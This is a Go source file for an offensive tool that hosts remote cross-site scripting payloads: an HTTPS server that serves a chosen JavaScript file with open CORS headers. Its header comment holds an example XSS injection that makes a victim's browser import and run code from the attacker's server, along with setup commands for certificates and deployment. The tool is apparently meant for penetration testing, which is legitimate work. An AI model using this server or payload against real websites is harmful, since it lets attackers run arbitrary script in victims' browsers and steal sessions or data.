/*
 * Remote XSS Payload Hosting
 *
 * For those moments when you have restrictions on payload length, but can
 * import remote JavaScript payloads. Run this somewhere and import from any
 * URI to have it return JavaScript payloads.
 *
 * Example payload:
 *   <img src=x onerror=import('//server.domain/')>
 *
 * Generate certificates with something like certbot, or for local testing:
 *   openssl req -x509 -newkey rsa:4096 -keyout server.key -out server.crt -days 365 -nodes
 * For certbot, something like this from the infra:
 *   certbot certonly --standalone -d [domain_pointing_to_server] --register-unsafely-without-email
 *
 * If you spin up infra and use certbot you'll need to run something like:
 *   nohup ./xss-server -key privkey.pem -crt fullchain.pem
 */
package main

import (
	"flag"
	"fmt"
	"log"
	"net/http"
	"os"
)

var (
	JsFile string
)

func main() {
	serverCrt := flag.String("crt", "", "Path to .CRT file for server. (Required)")
	serverKey := flag.String("key", "", "Path to .KEY file for server. (Required)")
	jsFile := flag.String("js", "script.js", "Path to JavaScript file to serve.")
	srvAddr := flag.String("s", "0.0.0.0:443", "Address for HTTP server to listen on.")
	flag.Parse()

	JsFile = *jsFile

	if *serverCrt == "" || *serverKey == "" {
		flag.Usage()
		os.Exit(1)
	}

	fmt.Println("Starting HTTPS listener on:", *srvAddr)
	http.HandleFunc("/", handleRequest)
	err := http.ListenAndServeTLS(*srvAddr, *serverCrt, *serverKey, nil)
	if err != nil {
		log.Fatal(err)
	}
}

// handleRequest will respond to requests with an open CORS
// policy and the content of the defined JavaScript file.
func handleRequest(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Server", "Rootshell XSS Server")
	w.Header().Set("Content-Type", "application/javascript")
	w.Header().Set("Access-Control-Allow-Origin", "*")
	jsFile, err := os.ReadFile(JsFile)
	if err != nil {
		log.Println(err)
		http.Error(w, "Javascript file not found", http.StatusNotFound)
		return
	}
	_, err = w.Write(jsFile)
	if err != nil {
		log.Println(err)
		http.Error(w, "Internal server error", http.StatusInternalServerError)
		return
	}
	log.Printf("JavaScript file served. Remote host: %s; Request URI: %s", r.RemoteAddr, r.RequestURI)
}
